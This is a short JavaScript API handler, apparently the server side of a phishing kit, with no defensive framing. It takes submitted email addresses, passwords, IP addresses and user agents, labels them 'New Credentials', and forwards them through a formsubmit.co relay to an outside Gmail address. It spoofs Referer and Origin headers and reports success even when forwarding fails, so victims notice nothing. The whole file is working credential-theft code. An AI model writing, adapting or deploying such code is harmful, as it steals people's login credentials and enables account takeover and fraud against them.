// api/collect.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, ip, userAgent } = req.body;

    const formSubmitUrl = 'https://formsubmit.co/ajax/g82443047@gmail.com';

    const host = req.headers.host || 'localhost:3000';
    const protocol = host.includes('localhost') ? 'http' : 'https';
    const referer = `${protocol}://${host}`;

    const message = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    const response = await fetch(formSubmitUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Referer': referer,
        'Origin': referer,
      },
      body: JSON.stringify({
        email: email || 'No email',
        password: password || 'No password',
        ip: ip || 'Unknown',
        userAgent: userAgent || 'Unknown',
        message: message.trim()
      })
    });

    const responseData = await response.json().catch(() => ({}));
    console.log('FormSubmit response:', response.status, JSON.stringify(responseData));

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in collect handler:', error);
    return res.status(200).json({ success: true });
  }
}